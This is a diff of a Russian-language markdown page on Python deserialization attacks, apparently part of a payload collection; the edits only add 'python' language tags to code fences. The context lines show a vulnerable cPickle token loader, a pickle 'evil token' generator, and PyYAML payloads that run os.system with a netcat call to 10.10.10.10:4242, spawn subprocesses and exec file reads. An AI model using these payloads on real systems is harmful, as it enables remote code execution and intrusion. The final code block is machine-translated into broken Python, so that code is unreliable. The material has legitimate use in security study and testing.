@@ -26,7 +26,7 @@ j0lt-github/python-deserialization-attack-payload-generator — Сериализ
 ### Pickle
 
 Следующий код — это простой пример использования cPickle для генерации auth_token, представляющего собой сериализованный объект User. :warning: import cPickle будет работать только на Python 2
-```
+```python
 import cPickle
 from base64 import b64encode, b64decode
 
@@ -43,14 +43,14 @@ print("Ваш токен авторизации: {}").format(auth_token)
 
 Уязвимость возникает при загрузке токена из пользовательского ввода.
 
-```
+```python
 new_token = raw_input("Новый токен авторизации: ")
 token = cPickle.loads(b64decode(new_token))
 print "Welcome {}".format(token.username)
 ```
 > Модуль pickle не защищён от ошибочных или вредоносных данных.
 
-```
+```python
 import cPickle, os
 from base64 import b64encode, b64decode
 
@@ -66,7 +66,8 @@ print("Ваш токен Evil : {}").format(evil_token)
 ### PyYAML
 
 > Десериализация YAML — это процесс преобразования данных в формате YAML обратно в объекты в таких языках программирования, как Python, Ruby или Java. YAML популярен для файлов конфигурации и сериализации данных, поскольку он удобен для чтения человеком и поддерживает сложные структуры данных.
-```
+
+```python
 !!python/object/apply:time.sleep [10]
 !!python/object/apply:builtins.range [1, 10, 1]
 !!python/object/apply:os.system ["nc 10.10.10.10 4242"]
@@ -74,11 +75,11 @@ print("Ваш токен Evil : {}").format(evil_token)
 !!python/object/new:subprocess [["ls","-ail"]]
 !!python/object/new:subprocess.check_output [["ls","-ail"]]
 ```
-```
+```python
 !!python/object/apply:subprocess.Popen
 - ls
 ```
-```
+```python
 !!python/object/new:str
 state: !!python/tuple
 - 'print(getattr(open("flag\x2etxt"), "read")())'
@@ -89,7 +90,8 @@ update: !!python/name:exec
 Начиная с версии PyYaml 6.0, загрузчик по умолчанию для ```load``` был переключен на SafeLoader, что снижает риски удалённого выполнения кода. PR #420 - [Исправление](https://github.com/yaml/pyyaml/issues/420)
 
 Уязвимыми приёмниками теперь являются ```yaml.unsafe_load``` и ```yaml.load(input, Loader=yaml.UnsafeLoader)```.
-```
+
+```python
 с open('exploit_unsafeloader.yml') в качестве файла:
 data = yaml.load(file,Loader=yaml.UnsafeLoader)
 ```
